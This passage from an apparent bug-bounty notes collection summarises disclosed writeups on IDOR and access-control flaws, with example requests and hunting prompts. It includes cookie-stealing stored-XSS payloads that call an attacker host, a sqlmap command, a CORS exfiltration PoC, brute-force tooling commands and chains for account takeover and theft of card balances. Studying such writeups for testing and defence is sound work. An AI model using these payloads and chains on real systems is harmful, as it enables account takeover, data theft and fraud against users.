  • Frontend-Backend Desync — FE strips the id, but manually adding `{user_id:"9991"}` to the body is still honored.
  • Cloud Job/Bucket Abuse — bruteforce `job_id/task_id/queue_id/bucket_name`; check S3/CDN export links.
  • GraphQL — `user(id:"victim"){email privateFiles{url}}` when resolvers skip ownership.
  • Parameter Pollution — `?id=1001&id=9991` and `?id[]=1001&id[]=9991` (PHP takes first, Express last, Spring errors) to desync the authz-vs-fetch id.
- Lesson/Q (NOVEL set): "If I can act on behalf of someone else by ANY means, it's IDOR." Tooling: Burp+Autorize+Logger++ , ffuf for ids, InQL/GraphQLMap. Hunt list: `/messages/:id`, `/export/job/:id`, `/update-profile (user_id in body)`, `/webhook/logs?id=`, `/admin/impersonate`. "Is the request body id bound to my JWT sub? Does the async worker re-check ownership? Does HPP let me pass two ids?"

### [109] Chaining IDORs — response of IDOR#1 yields the id for IDOR#2 — Gentil Security (NOVEL)
- `GET /api/v2/orders/{orderID}` numeric (`10542`→`10541`) → other user's order (basic IDOR). The order JSON contained a DIFFERENT prefixed id: `"shipping_details_id":"SHP-9477B"`. Hypothesised a sibling endpoint → `GET /api/v2/shipping/SHP-9477A` → full name+address+phone of another customer. Two chained IDORs: the first leaks keys that unlock the second, escalating P3→P1.
- Lesson/Q (NOVEL): always read the IDOR response for OTHER object ids (prefixed like `SHP-`, `INV-`, uuids) and pivot each into its own endpoint. Prefixed ids are still enumerable (mutate the suffix). "What other object references are inside this response, and is each of THOSE endpoints also unprotected?"

### [110] Multi-tenant export IDOR → plaintext passwords (P1) — Abhishek
- Two-tenant program (roles for Tenant 1 & 2). Admin "download users" feature sent a numeric id. Manual change failed; Burp Intruder 1..44 → 3 distinct response LENGTHS → those ids downloaded files containing Tenant 2 users' usernames, PASSWORDS, emails, phones (full PII). Marked P1.
- Lesson/Q: target export/download/report functions with a numeric list/tenant id; Intruder a range and CLUSTER BY RESPONSE LENGTH to find the ids that return data. Exports frequently dump more (even plaintext passwords) than the UI shows. "Does the bulk-export endpoint honor another tenant's/list's id?"

### [111] Automated IDOR scanner pattern (sensitive-data oracle) — Lord Murak [tooling/methodology]
- `idor_hunter_simple.py`: for an URL template with `{ID}`, request a valid id, then a modified id, and flag IDOR when: status 200 + body differs + a SENSITIVE-DATA regex matches + length-difference ratio >5% (to kill false positives). Ships PII regexes (email, phone, credit_card, plus locale ids like CURP/RFC/NSS and medical fields diagnosis/medication/blood_type) used as the detection ORACLE. Modes: export known endpoints / scan range / scan-all.
- Lesson/Q: automate the swap, but make the ORACLE smart — don't just diff length; regex the response for PII/secret shapes to confirm real leakage and suppress noise. Reusable detection oracle for the skill's automation layer. "What regex signature proves the modified-id response actually leaked someone else's data?"

### [113] Critical privesc — IDOR on the ROLE-PERMISSION endpoint (hardened SaaS) — Whoami/mrro0o0tt (NOVEL mindset)
- On a heavily-pentested SaaS, ignored flashy bugs and targeted ROLE MANAGEMENT (what other hunters skip). Captured the admin's `PUT /webapi/security/{Role-ID}/businessroles/` (JSON list of perms with `isChecked`). Replayed it with the low-priv MANAGER's cookie + the Manager's own Role-ID, all perms `true` → 200 → Manager gained every permission (incl. "edit role security") = global admin. Then swapped Role-ID to any other role to rewrite it too. Got all Role-IDs from a "boring" metadata endpoint `GET /webapi/security/businessroles/` that returned every role's id even to a Manager.
- Lesson/Q (NOVEL): attack the system that DEFINES access (role/permission management), not just user-data IDORs — replay an admin's permission-update with a low-priv session + your own role id. Mine unsexy metadata endpoints (`/businessroles`, `/roles`, `/permissions`) for ids; they're often unrestricted. On mature targets, your edge is the endpoint everyone found "too boring." "Can a low-priv user invoke the endpoint that edits role permissions, and does any endpoint list all role ids?"

### [114] IDOR in the forgot-password completion response → enumerate to admin — Dinesh Narasimhan (NOVEL)
- Gov app, login+reset both OTP-gated. In the forgot-password flow: enter own phone → correct OTP → set new password → intercepted the request/response and saw `id={number}`. Made a 2nd account, took ITS id, substituted it → the app returned the OTHER user's data WITHOUT having verified that user's OTP (it trusted the id, not the OTP-proven identity). Enumerated numeric ids → `id=4` = the admin account → effectively owned the app.
- Lesson/Q (NOVEL): the id that the reset flow binds the new password / returned profile to is an IDOR target — if you swap it after passing YOUR OWN OTP, you may act on a victim who never proved identity. Low integer ids (`id=4`) reach the earliest/admin accounts. "Does the reset flow bind the action to the OTP-verified user, or to a client-supplied id I can change?"

### [115] PwnFox multi-session methodology + hidden-IDOR tips — hackersatty [methodology]
- Tooling: PwnFox (Firefox) = multiple identities in ONE window, COLOR-coded (Blue=user, Red=admin, Green=guest) and piped into Burp — makes A/B IDOR testing fast/visual without re-login; HackBrowserData for token/cookie extraction; curl/Postman for clean API (esp. mobile) replay; JWT.io. Method: register ≥2 roles → map endpoints (Logger++) → find ids (`user_id,account_number,document_id,report_id`, also hidden fields/URLs/headers) → swap → confirm in the other color profile → replay in curl. Bonus: numeric→UUID→username swaps, test PUT/PATCH/DELETE, compare mobile vs web (auth inconsistency), combine race condition + IDOR.
- Lesson/Q: keep ≥2 colored sessions live to instantly compare; manual beats Autorize for logic/context IDORs. "Did I test this id swap under each role AND on the mobile API, across all verbs?"

### [116] IDOR in URL PATH during resource CREATION (upload into others' project) — Shubham Tiwari (NOVEL surface)
- Illustrative SyncVault case: `POST /v1/upload_to_project/{project_id}/new_file`. The `project_id` lives in the PATH; backend checked authentication (valid user) but not project MEMBERSHIP. Changed `proj-alice-q4r`→`proj-bob-tsd` (victim's project) with Alice's token → 201 Created → Alice's file (e.g. `malicious_payload.exe`) landed in Bob's project. Why missed: testers focus on query/body ids and skip PATH params; system assumes "project already selected."
- Lesson/Q (NOVEL): test PATH-segment ids on WRITE/CREATE/upload endpoints, not just reads — you may inject files/records into other users' containers (malware delivery, quota DoS, overwrite). Enumerate the id in every URL segment. "Does this create/upload verify membership of the project/folder id in the PATH, or just that I'm logged in?"

### [112] Primer (AZ) — orders IDOR — Nijat Aliyev [reinforcement]
- `GET /api/orders/23`→`24` → another user's order; backend serves by id without owner check. Defenses: per-request authorization, access-control layer, UUIDs, automated+manual tests (Postman with another user's token). Reinforces core model + the dev-side framing (Node/Django/Laravel all affected).

### [119] "Pending/unapproved" user deletes all users via JS-found endpoint — 0xBen (NOVEL)
- Registered → stuck in "Pending Status" (needs admin approval, UI shows nothing). Instead of giving up, downloaded & analyzed the app's JS files → extracted `POST /api/users/delete`. Made a 2nd account to test; victim id `27616` was SEQUENTIAL → deleted every user incl. admins. The app assumed a not-yet-approved user couldn't do anything, so it never authorized the endpoint.
- Lesson/Q (NOVEL): a "pending/unapproved/limited" account is NOT access control — its restriction is usually UI-only; the backend endpoints (mined from JS) still execute. Test destructive endpoints from a pending/low-tier account. "Does my unapproved account still get a working session token that backend endpoints accept?"

### [120] $ IDOR on restaurant menu — only 1 of 3 upload methods vuln; uuid harvested from CUSTOMER favorites — Yahia Sherif (NOVEL ×2)
- Restaurant platform (manager + customer roles). Menu upload had 3 methods (PDF / image / link), all GraphQL with `restaurantUuid`. Swapping uuid on the PDF (`generateMenuSignedUrl`) and image methods → "Unauthorized". But the LINK method (`uploadMenuUrl`) lacked the check → injected a link into the victim restaurant's menu. Blocker: `restaurantUuid` is unguessable. Fix: switched to the CUSTOMER account and exercised every interaction (book/cancel/review/report/FAVORITE); grepped Burp for `restaurantUuid` → it was reflected in the add-to-favorites `CreateBookmarkCollection` mutation → harvested the target uuid.
- Lesson/Q (NOVEL): test EVERY sub-method of a feature separately — authz is often applied unevenly (2 of 3 upload paths secured, 1 not). And harvest an "unguessable" uuid from a DIFFERENT role/feature that reflects it (customer favorites/reviews/booking expose the merchant's uuid). "Which variant of this action skipped the check, and where does another role's feature leak the id I need?"

### [121] $1000 legacy-subdomain CORS + IDOR chain — TheIndianNetwork
- Wide scope. Recon: `subfinder/assetfinder/amass` → `httpx -title -tech-detect` → spotted `legacy-api.target.com` (Express, CORS). Headers: `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` = insecure CORS → JS PoC `fetch(.../api/user/profile,{credentials:"include"})` reads authed data cross-origin. Then `GET /api/user/invoice?id=20485`→`20486` (no token check) = IDOR leaking name/email/amount/billing. Chained: CORS exfil + IDOR enumeration → mass invoice exposure.
- Lesson/Q: enumerate FORGOTTEN subdomains (`legacy-`, `staging-`, `old-`, `internal-`) — they run older code with weaker authz/CORS. Always read CORS response headers; chain CORS (cross-origin read) with an IDOR (other users' ids). "Is there a legacy API host with permissive CORS AND numeric id endpoints?"

### [117] Attack-vector taxonomy + real cases — Krish Kandhari [reinforcement]
- Three vectors: predictable refs (`/invoice?id=1001`++), hidden API params (UUIDs that "look random but are reusable" → reuse a `file_id` from one response in another request), mass assignment (`POST /update_profile {"user_id":"victim123","email":"hacker@evil.com"}` → change victim's email). Real disasters: Facebook 2013 (private photos via album id), Uber 2016 (driver licenses), Telegram 2020 (private group chats). Detection: look for missing 403s, non-expiring UUID links, sequential ids.
- Lesson/Q: reuse ids seen in ANY response elsewhere; "random-looking" ≠ safe if reusable/non-expiring. Mass-assign a `user_id`/`email` you don't own into update requests.

### [118] Primer (gym app) + secure-code snippet — Natarajan C K [reinforcement/defensive]
- `fittrack.com/profile?id=123`→`124`. Fix pseudocode: `if (requestedUserId !== loggedInUserId) return 403;`, indirect refs (`?ref=ab12cd34`), least privilege, log sequential-access patterns. Standard primer; the explicit server-side ownership check is the canonical fix to cite.

### [122] Private-content leak via the TRANSLATION sub-feature — Zephyrus (NOVEL surface)
- Social app, public vs private accounts (private videos viewable only by followers). The translate-description endpoint `POST /videos/translation` body `id_video=123&type_language=us` returned `{description_video:...}`. Swapped `id_video` to a PRIVATE account's video id (attacker not a follower) → it returned the private video's description. The privacy control guarded the main view path but NOT the translation path.
- Lesson/Q (NOVEL): privacy/visibility controls are often enforced only on the primary content endpoint — secondary/derived features (translate, preview, transcript, caption, export, oEmbed, thumbnail) re-fetch the object WITHOUT the visibility check. Feed private object ids into every auxiliary feature. "Does the translate/preview/export of this private object re-check that I'm allowed to see it?"

### [123] IDOR to lift YOUR OWN network-ACL (privesc) — Mohan Kumar N (NOVEL angle)
- RBAC SaaS with network/IP-based ACLs: Admin sets ACLs for everyone; Employee may edit the "User" role's ACLs but NOT his own (Admin-set). As Employee `user2`, started editing `user3`'s ACL, saw an `id` param selecting whose ACL is edited → changed it from `user3`'s id to `user2`'s OWN id → removed his own network ACL restriction (IP/VPN gate) = privilege escalation.
- Lesson/Q (NOVEL): when you can manage OTHERS' settings/restrictions but not your own, swap the target id to YOURSELF to edit/lift your own limits (ACL, quota, role, feature flags). IDOR can target your own otherwise-locked object. "I can edit subordinates' restrictions — can I point that same request at my own id to remove my limits?"

### [124] Mobile decompile → hidden /manager phantom APIs — Invik (NOVEL recon, partial/member-only)
- Mobile-app target; public APIs looked clean. Decompiled the Android APK and extracted ALL endpoint strings, then batch-tested with a Python script (his mobile equivalent of Burp "find something"). Found ~10 `/manager`-prefixed paths NEVER seen during normal app use (admin/legacy). Most → 401, but `/manager/user` was reachable (returned empty, i.e. needs params) → pursued into an IDOR. (Body truncated/member-only, but method is the value.)
- Lesson/Q (NOVEL): decompile mobile apps (APK/IPA) and grep for endpoint strings — "phantom"/admin/legacy APIs (`/manager`,`/admin`,`/internal`) are referenced in code but invisible in the UI. Batch-test them. "What endpoints exist in the binary that the app never calls in normal use?"

### [125] $800 — find unauth endpoints via ERROR-TYPE differentiation, then JS param trace — Invik (NOVEL)
- Backend with no login/registration/reset; behavioral CAPTCHA killed brute force. Extracted paths (FindSomething) and noticed responses fell into 3 buckets: 401 Unauthorized, 500 Server Error, 405 Method-Not-Allowed. INSIGHT: a properly-protected endpoint returns 401/405; a 500 SERVER ERROR means the endpoint ran past auth and only failed on missing/invalid params → it's NOT auth-gated. Filtered for 500s → `/manager/finance/overview` → searched JS for that path → found `tenantId` param → fuzzed a 4-digit id → financial data for ALL tenants. ~20 min, never logged in.
- Lesson/Q (NOVEL): triage endpoints by ERROR TYPE — a 500 (not 401/403) on an unauthenticated request flags an endpoint that skips auth and just needs the right params. Then trace its params in JS and supply them. "Which paths throw 500 instead of 401? What params does JS pair with that path?"

### [126] Gov portal action-param IDOR (enumerate to admin) — Akash kumar K [reinforcement, real]
- `POST /sso_api/app/api/api_results.php` body `case=getprofile&user_id=3000&app_id=4` → change `user_id` to `1` (admin) or `3001/3002...` → other users' profiles incl admin/staff. Unauthenticated enumeration of every profile. (CERT-In disclosure.)
- Lesson/Q: PHP `*_results.php?case=<action>&user_id=` action-dispatch endpoints are classic IDOR — enumerate `user_id` and try `case=` variants. Low ids (1) reach admin/staff.

### [127] "Find IDORs like a pro" — 5 distinct techniques — Omar ElSayed (HIGH-VALUE, NOVEL set)
- Bug1 (method swap): POST id-swap returned `204 No Content` (a TELL that something processed) → switched to GET → full victim PII. "204/empty isn't 'safe' — retry with GET."
- Bug2 (pagination dump): `/api/account` had no id; the real id was unguessable. Probed siblings `/api/user`,`/api/users` → `/api/users` returned one user; added params → `/api/users?page=1&size=1`, then INCREMENT `size` → dumps more/other users. "Add page/size/limit/offset to list endpoints to exfiltrate everyone."
- Bug3 (authorId assignment): post-create body had `authorId` + `team[0][user][id]` → set them to admin's id → create/edit/delete posts AS that user. "Set author/owner id in create bodies to act as others."
- Bug4 (hash on one action, not another): tickets at `/Issue/9085/<sha1hash>` — changing id alone failed (hash tied to id). But the COMMENT action used only the id (no hash) → `9085`→`9084` worked → comment on others' tickets; and `AuthorId` `0`→`1` → post AS a support rep. "Find the sibling action that omits the integrity hash."
- Bug5 (base64 id:id auth header → ATO): profile-update `user_id` swap → "User not authenticated", because a custom auth header `ODIxMjIyODY6ODIxMjIyODY=` decoded to `82122286:82122286` (your own id:id). Re-encoded the VICTIM's id `id:id` → accepted → changed victim email → password reset → full ATO.
- Lesson/Q (NOVEL): decode EVERY custom auth/header/cookie — if it's just `base64(id:id)` or contains your id, forge the victim's. When an integrity hash blocks the main action, hunt a secondary action that drops it. "Is authorization carried in a forgeable encoded header? Which action omits the hash the protected one requires?"

### [128] Sequential-id profile-update IDOR → ATO (overwrite password) — black_virus [reinforcement]
- 2 accounts → ids 534/535 (sequential). `PUT /account/534` body `username&password&confirm_password` (attacker session). Swapped path to `/account/535` (victim) keeping attacker cookie → overwrote the victim's password (didn't even need to set username). 200 OK → logged in as victim with the new password = ATO. Enumerable ids → any account.
- Lesson/Q: profile/account-update endpoints that take the target id in the PATH and a new password in the body = direct ATO; you only need to overwrite the password field. "Can I PUT a new password to another account's id with my own session?"

### [129] $1230 financial ATO + 2FA-bypass money theft — Tanvir Ahmed (NOVEL chain)
- Fintech. All profile changes carried `UserID` in the body. Changing email with victim's UserID alone didn't fire. But the self-scoped PASSWORD-CHANGE `{Password, NewPassword}` did NOT normally include UserID — he ADDED `UserID: <victim>` → server changed the victim's password → ATO. Escalation: transfers need an SMS OTP, but there's no 2FA on profile edits → change the victim's PHONE NUMBER → request the transfer OTP to the ATTACKER's device → drain funds.
- Lesson/Q (NOVEL): inject the `UserID`/`accountId` param into a SELF-scoped action that normally omits it (password change) — the backend may honor the override. Then defeat transaction-OTP by first changing the victim's phone/email (often un-2FA'd) so the OTP routes to YOU. "Does adding an owner-id param to a 'change my own X' endpoint let me change someone else's? Can I move the OTP destination before the OTP step?"

### [130] IDOR checklist (consolidated tips) — CaptinSHArky/Mahdi [methodology]
- Rapid-fire test list: HPP `id=200&id=201`; invite-to-org-with-admin then swap org id→victim (privesc); `/api/users?page=1&size=1` (list dump); any id in PUT/POST/path → swap id OR switch method (PUT/POST/PATCH→GET); DevTools for hidden ids; Burp Intruder to discover which endpoint hands out ids; try NEGATIVE ids (`-05458`) to bypass checks; manipulate token-generation flows; `callback` params in URLs (IDOR/XSS, ASP bypass); SaaS integration download endpoints; ids inside COOKIES; `request_id` in Wayback/Internet Archive.
- Lesson/Q: keep this as a fast triage checklist per id-bearing request. Negative/HPP/method-swap/cookie-id are the cheap wins people skip.

### [131] $1000 chat-message IDOR → S3 links → PII — Bytesnull (NOVEL pivot)
- Numeric `message` id param; expected 403 (anti-enumeration) but got 200 for EVERY random number → wrote a Python scraper to pull all messages, then grepped for sensitive data → found many S3 links embedded in chats → opened them → other users' PII. (He also notes the value came from revisiting an API that "kept bothering" him.)
- Lesson/Q (NOVEL): after dumping messages/notes/comments via an IDOR, GREP the content for embedded links (S3/CDN/signed URLs), tokens, and attachments — the real PII is often one hop away in linked files. "What URLs/attachments are inside the records this IDOR dumps, and are those buckets public?"

### [132] IDOR param is ALSO SQLi → full DB takeover — Ali Mezar (NOVEL pivot)
- `EventsReservation.aspx?uiid=X` (ASP.NET/IIS/MSSQL). Blank → error; own id → my name+email; `uiid=1` → another user (unauth IDOR). Reasoning: if this param pulls a record straight from the DB, it may be injectable → ran `sqlmap -u ".../EventsReservation.aspx?uiid=1"` → confirmed SQLi → enumerated all DBs/tables/columns/data. IDOR escalated to full database read.
- Lesson/Q (NOVEL): an IDOR parameter that directly fetches DB rows is a prime SQLi target — point sqlmap at it. The same unvalidated input enabling IDOR often also lacks parameterization. "This id pulls a DB record with no authz — is it also concatenated into the query (SQLi)?"

### [133] IDOR→stored XSS(bio)→cookie theft→ATO ($6500) — Krish_cyber [reinforcement chain]
- `/api/user/{ID}/posts` increment → other users' private drafts (scripted range scan; flagged responses containing "private"). Bio field allowed "limited HTML" → `<script>fetch('attacker/steal?cookie='+document.cookie)</script>` stored XSS on profile → harvested visitors' cookies. Session token was base64(`user_id`+`role`) → swap victim cookie in DevTools → ATO (some users were admins). 
- Lesson/Q: the recurring high-value chain = IDOR (read scope) + stored XSS (in a profile/bio/notes field) + weak session token (decode/replace) → ATO. Always test "limited HTML" fields and decode session cookies. "Does any free-text field render HTML, and is the session token just base64(id/role) I can swap?"

### [134] UUID enumeration tooling — Canonminibeast [tooling]
- For "unguessable" UUID-gated endpoints, `uuid-enum` (github it4chis3c/uuid-enum) brute/sequence-tries UUIDs: `python3 uuid_enum.py -u "https://target/user/UUID_HERE" -m sequential ...`. Most useful against UUIDv1 (time+MAC ordered → partially predictable) or apps that leak/recycle uuids; pure UUIDv4 random is not brute-forceable, so pair with id-harvesting (see [69],[106],[120]).
- Lesson/Q: identify the UUID VERSION (v1 time-based = attackable ordering; v4 = random) before brute-forcing; otherwise harvest the uuid from another endpoint. "Is this a v1 (ordered) UUID I can sequence, or must I leak it elsewhere?"

### [135] IDOR add-secondary-email → password reset to attacker → ATO — Salman Rahman (NOVEL chain)
- `profile.<target>` GraphQL "Edit Photo" used a 10-char `id`; the victim's id was disclosed on their public profile URL `/profile/xyz`. Swapping `id` → changed others' profile pics (IDOR #1). Then the "add secondary email" feature was ALSO IDOR (no validation) → added the ATTACKER's email to the VICTIM's account → used Forgot Password → reset link arrived in the attacker's inbox → reset victim's password → full ATO.
- Lesson/Q (NOVEL): the highest-value IDOR target is "add/edit secondary email / recovery email / phone" — if you can attach YOUR contact to a victim's account, the normal password-reset flow hands you their account. Harvest the victim's id from their public profile URL. "Can I add my email/phone to another user's account, then trigger their reset to me?"

### [136] Transit-card balance theft via unauth id + response-LENGTH oracle — Jacob Lummus (NOVEL oracle)
- MyWay+ "Balance Transfer Tool" took a legacy card's 9-digit id and transferred its funds to your account WITHOUT verifying ownership. Burp Intruder over card-id range; the ORACLE was HTTP response LENGTH: 1413=card doesn't exist, 1418=already transferred, 1410/1411=PENDING with `cardBalance` (funds available). Picked the small-length ones → transferred strangers' balances. Mitigations tried (rate-limit ~20 req, length padding) don't fix the root missing-auth.
- Lesson/Q (NOVEL): when responses look uniform, the exact byte LENGTH is your status oracle — map each length to a state (exists/empty/funded) and Intruder-enumerate. Money-movement tools that take only an account/card id with no ownership check = unauth theft. "What does each distinct response length mean, and which length flags a target worth hitting?"

### [137] Stored XSS into ANOTHER user's file via metadata field + predictable refNo → mass session hijack — bombon/bxmbn (NOVEL)
- Insurance portal: uploaded files tied to a numeric `refNo` (R2326400539), viewable at `xxx.asp?refNo=`. The upload POST had `njfbRefNo` (target ref) + `fileUidList` (file metadata string). Put an XSS payload inside `fileUidList` and set `njfbRefNo` to ANOTHER user's refNo → stored XSS saved under the victim's file view page. Session cookie was NOT HttpOnly → `<svg onbegin=location='//attacker/?'+cookie>` exfiltrates it. Upload endpoint required NO AUTH → inject XSS into ANY (incl. future) refNo anonymously → mass ATO; could also overwrite victims' existing files by changing refNo.
- Lesson/Q (NOVEL): IDOR-WRITE + stored XSS combo — when an upload/edit lets you target another user's object id (refNo), smuggle an XSS payload into a metadata field (`fileUidList`, filename, title) so it executes on the VICTIM's view page. Check HttpOnly on session cookies. Unauthenticated write endpoints make it wormable. "Can I write to another user's object id, and does any field of it render unsanitised on their page?"

### [138] Dual-id (numeric vs 32-char) + omit-id dumps all — Tanvir Ahmed (reinforcement of multi-id/blank-id)
- Company-create response exposed a 32-char unguessable user id; CSRF token could be set to `dummy` (no CSRF validation, weak alone). KEY: account creation had ALSO shown a NUMERIC id `18356` → replaced the 32-char id with `18356` → worked (system accepts both formats); new account = `18357` (sequential). Then hitting the `/UserId` endpoint with NO id → returned ALL users' info.
- Lesson/Q: when an object has an unguessable id, check whether a PARALLEL guessable id (sequential numeric) is also accepted for the same record; and try OMITTING the id entirely (may dump everything). "Is there a second, guessable identifier for this object? What does the endpoint return with no id at all?"

### [139] Encryption-as-access-key → sequential policy IDs → insurance PDF + portal ATO — bombon/bxmbn (URL140, NOVEL)
- Insurance/event-registration service. Found `/api/claims/encrypt?text=EUSP2386411060` returned the ENCRYPTED form of his own policy id; that ciphertext is then used at `/api/certificates/policies/{encrypted}` to fetch the policy PDF (full name, DOB, address, coverage dates). Policy IDs are SEQUENTIAL, so for any victim id: call the public encrypt endpoint → get its access key → fetch PDF. Escalation: portal login offers "Policy Number" + "Purchase Date" auth; the purchase date is IN the leaked PDF → full takeover (view/modify/cancel policy).
- Lesson/Q: an app that "protects" objects with encryption can hand you the key. Hunt endpoints that encrypt/sign/encode arbitrary input ("encrypt","sign","token","generate-link","share"). If ciphertext is the ONLY check and the plaintext id is guessable/sequential, it's full IDOR. Also chain: PII leaked in step 1 (purchase date) may be the secret that passes step-2 auth. "Is there an endpoint that will encrypt MY id for me? Is the encrypted blob the sole object-fetch check? Are underlying IDs sequential? Does leaked data unlock a later auth/reset step?"

### [141] Netflix Dispatch — Stored XSS + IDOR → session hijacking → ATO — Viktor Mares (URL142, PARTIAL/member-only)
- Target: Netflix's open-source **Dispatch** incident-management app. Scope nuance: in scope only if you set it up from scratch yourself (dispatch-docker NOT in scope). Picked it for rich Slack/GSuite/Jira integrations + lack of step-by-step docs (less-trodden surface = fewer dupes). Chain reported: stored XSS + IDOR → session hijack → account takeover. [Body is member-only; scope/approach captured, deep exploit steps pending friend-link/archive retry.]
- Lesson/Q: many programs allow a "bring-your-own self-hosted instance" — stand it up locally and READ THE SOURCE to find object-level checks. Incident-management/ticketing tools concentrate cross-team PII and are XSS+IDOR rich. "Can I self-host the target to read its authz code? Which fields are stored and rendered to OTHER users (stored-XSS sink) AND keyed by a guessable id (IDOR)?"

### [142] "Unguessable" UUID profile, but session never bound to the UUID — Mohammed Khalid/n0x1 (URL143)
- Target identifies users by UUID (looks unexploitable). He still tried, in order: (1) `waybackurls` + UUID regex to harvest leaked UUIDs (not found), (2) API/JS disclosure of UUIDs (not found), (3) the decisive test — does the update function verify the SESSION owns the submitted UUID? Created a victim account, took its UUID, sent a profile-update with victim UUID + his OWN cookies → victim's profile changed. Server trusted the body UUID, never checked it against the session.
- Lesson/Q: UUID ≠ safe. Unpredictability only blocks enumeration; it adds NO ownership check. Always run the "valid pair, wrong session" test — victim's id + YOUR cookie; if it works it's IDOR regardless of id format. Try to source UUIDs first (wayback, JS, API responses, invite/share/iframe links), but even without them, prove the missing authz using a victim account you control. "Does the server verify session-owns-UUID, or trust the UUID alone?"

### [143] Decrement numeric id on group profile-picture URL → other groups' private images — Tanvir Ahmed (URL144, Target.com $50)
- A private company/group's uploaded profile picture opens in a NEW TAB at a URL containing a numeric image `id`; decrementing the id (e.g. `9409622`) returned another group's private picture → enumerate to harvest many tenants' private images.
- Lesson/Q: every "open image in new tab" / asset URL with a numeric id is an IDOR candidate, including "private" group content — check media/avatars/attachments, not just JSON APIs. "When I open an uploaded asset directly, is it served by a guessable id with no membership check? Can I +/- to reach other tenants' media?"

### [144] Resource: "Top 235 IDOR bug bounty reports" compilation — aimasterprompt (URL145, link index)
- A curated index of 235 disclosed IDOR reports. Not a technique writeup; valuable as a corpus pointer for pattern-mining endpoint shapes. No novel method beyond "study disclosed reports."
- Lesson/Q: maintain a personal corpus of disclosed IDOR reports and pattern-match new targets against known vulnerable endpoint shapes. (Catalogued, no new test.)

### [145] Autorize — automated low-priv replay across the WHOLE session — hackersatty (URL146)
- Burp **Autorize** extension: load a low-priv (or unauthenticated) session token, browse the app as a high-priv/admin user; Autorize replays every request with the low-priv token and flags where responses MATCH (= missing authz). Confirmed a non-admin Bearer token retrieving `/api/orderDetails` and GraphQL `Order_GetDetails`/`Order_GetTransaction` (orderId) admin-only data (order id, user id, status, hash).
- Lesson/Q: don't hand-swap ids — automate "does a weaker identity get the same response?" across the entire app (Autorize, or Caido's equivalent). Works for REST and GraphQL operationName calls. "If I replay this exact request with a lower/zero-privilege token, do I still get the protected data?"

### [146] Physical gift-card QR → web acctID IDOR, balance oracle, $20k enumerated — Jacob Masse (URL147, NOVEL surface)
- Saw a restaurant gift card redeemed by scanning a QR on its back; scanned it himself → URL `…/checkcardbalanceonipad?acctID=...`. acctID is the ONLY authentication (no PIN/2nd factor), IDs near-sequential, no rate limit. Oracle: valid card shows "$" balance, invalid shows "No Balance Available for this Account". Script incrementing acctID + parsing for "$" → $20k+ across 300+ cards in 30 min; funds spendable in-store via crafted QR or online with the code.
- Lesson/Q: offline/physical artifacts (QR, barcodes, NFC, printed account numbers) are IDOR entry points — scan/decode them to reach the backing web endpoint. When an id is the sole credential ("if you have the id, you own it"), enumeration = mass theft. Build a valid/invalid oracle (string or response length) and check rate limiting. "What endpoint backs this QR/barcode? Is the embedded id the only auth? Is there a valid/invalid oracle and no rate limit?"

### [147] Target.com account-mgmt IDOR (dual numeric/alnum id + CSRF dummy + omit-id dumps all) — Bug Bounty Logs (URL148, DUP of [138])
- Identical technique to [138]: company-create returns a 32-char id; CSRF token set to `dummy` still accepted; a NUMERIC id (18356) seen at signup also works in place of the 32-char id; next account = 18357 (sequential); hitting `/UserId` with NO id returns ALL users. Triaged Critical.
- Lesson/Q: (reinforces [138]) when a record has an unguessable id, look for a parallel guessable numeric id accepted for the same record, weak/absent CSRF, and an id-less variant that dumps everything.

### [148] Race condition to shrink a time-based UID → screenshot IDOR — one33se7en (URL149, NOVEL brute-force reduction)
- SaaS translation app; `GET /…/s/display?encoded_data=<UID>` had NO authz → swap `encoded_data` to read other projects' private screenshots. UID looked long, but across accounts most chars matched/were junk; the real difference was ~6-7 chars. He uploaded two screenshots in the SAME time window from different sessions via a single-packet (race) attack so their UIDs shared the time-derived portion → only 3 chars left to brute-force. Found a teammate's screenshot, proving cross-user exposure.
- Lesson/Q: when an "unguessable" id encodes a timestamp/sequence, force collisions — create two objects at the same instant (single-packet/race) so they share the time component, then diff the ids to isolate the few truly-random chars. "How much of this token is time/sequence-derived? Can I shrink the search space by generating objects simultaneously and diffing their IDs?"

### [150] Per-verb testing of ONE feature → 4 access-control bugs (delete/complete/upload/download) — Whoami/mrro0o0tt (URL151)
- "Task" feature: User B has no task rights. He tested EACH action separately by replaying User A's request with User B's cookie: add task → blocked ("not authorized"); `GET /org/tasks/DeleteTask/3584041` → works (delete ANY task); `GET /org/tasks/CompleteTask/3584088` → works; then "Manage Files": upload as A, drop, swap cookie to B → upload works; `GET /org/tasks/files/download?id=xxxx` → download ANY file works. The download endpoint was discovered from Burp's **Sitemap tab parsed from RESPONSES** (not seen in requests). Feature-specific methodology (per Zseano): enumerate every verb a feature offers and test each for missing object/role checks. Notes escalation via malicious upload (stored XSS/shell on whoever downloads).
- Lesson/Q: don't test "a feature" as one unit — test every ACTION it exposes (create/read/update/delete/complete/upload/download/export/share) independently with a low-priv cookie; one verb may be protected while others aren't. Mine Burp Sitemap (built from response links) for hidden endpoints. "For this feature, which individual actions enforce authz and which don't? Which endpoints appear in responses that the UI never calls for me?"

### [151] String/name as the object ref → modify another company's PayPal payout email — CaptinSHArky/Mahdi (URL152, money redirect)
- Referral ("Alliance") section asks for the referrer's PayPal email; request was `POST /api/auth/companyInfo/Alliance/SharkyCompany` body `{"email":"..."}`. He changed the company NAME in the path `SharkyCompany`→`Tesed` (another company) → `200 Success` → can set ANY company's payout PayPal email (redirect referral earnings). Methodology: start at main domain, learn the program logic/features, then analyze each request for access-control/parameter tampering.
- Lesson/Q: object references are often STRINGS (company/tenant/workspace slugs, usernames), not integers — swap them. Payout/withdrawal email fields are high-impact IDOR targets (money redirection). "Is the identifier a human-readable name I can swap for another tenant's? Does changing a payout/withdrawal/email field for another org return success?"

### [149] THM IDOR room (encoded/hashed/unpredictable IDs + parameter mining) — Cheryl Maise Lobo (URL150, DUP of THM cluster [46-54], extras)
- Educational room reinforcing: base64-encoded IDs (decode→edit→re-encode at base64decode.org), HASHED IDs may be md5(integer) → run through crackstation.net to recover the int, unpredictable IDs → create 2 accounts and swap ids. WHERE they hide: not just the address bar — AJAX calls, endpoints referenced in JS files, and **parameter mining** (an endpoint like `/user/details` authenticated by session may secretly also accept `user_id=123` and return others' data). Practical pattern: `/api/v1/customer?id={user_id}`.
- Lesson/Q: decode/transform suspicious ids (base64; md5-of-small-int via crackstation). Param-mine "self" endpoints for an optional id param the UI never sends. "Is this id encoded/hashed so I can forge it? Does my /me//details endpoint accept an injected user_id/account_id?"

